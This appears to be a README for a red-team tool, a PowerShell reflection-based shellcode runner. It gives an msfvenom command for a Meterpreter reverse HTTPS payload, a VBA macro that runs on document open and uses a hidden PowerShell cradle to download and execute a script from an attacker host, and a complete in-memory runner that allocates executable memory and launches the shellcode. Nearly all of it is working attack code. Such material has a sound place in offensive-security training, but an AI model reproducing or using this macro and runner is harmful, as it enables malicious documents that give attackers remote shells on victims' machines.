# PowerShell-Reflection-Shellcode-Runner

Payload generation

  msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f ps1
  
 our Microsoft Office 2016 version of Word is a 32-bit process, which means that PowerShell will also launch as a 32-bit process.

VBA code calling the PowerShell cradle that executes the shellcode runner

                    Sub MyMacro()
                      Dim str As String
                      str = "powershell (New-Object System.Net.WebClient).DownloadString('http://<kali ip>/run.ps1') | IEX"
                      Shell str, vbHide
                    End Sub
                  
                    Sub Document_Open()
                      MyMacro
                    End Sub
                  
                    Sub AutoOpen()
                      MyMacro
                    End Sub

we can also try and use .txt extension 

Complete PowerShell script for in-memory shellcode runner

		function LookupFunc {
		
			Param ($moduleName, $functionName)
		
			$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
		    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
		      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
		    $tmp=@()
		    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
			return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
		}
		
		function getDelegateType {
		
			Param (
				[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
				[Parameter(Position = 1)] [Type] $delType = [Void]
			)
		
			$type = [AppDomain]::CurrentDomain.
		    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
		    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
		      DefineDynamicModule('InMemoryModule', $false).
		      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
		      [System.MulticastDelegate])
		
		  $type.
		    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
		      SetImplementationFlags('Runtime, Managed')
		
		  $type.
		    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
		      SetImplementationFlags('Runtime, Managed')
		
			return $type.CreateType()
		}
		
		$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
		
		[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...
		
		[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
		
		$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) 	
  			([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
		
		[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
		
		  
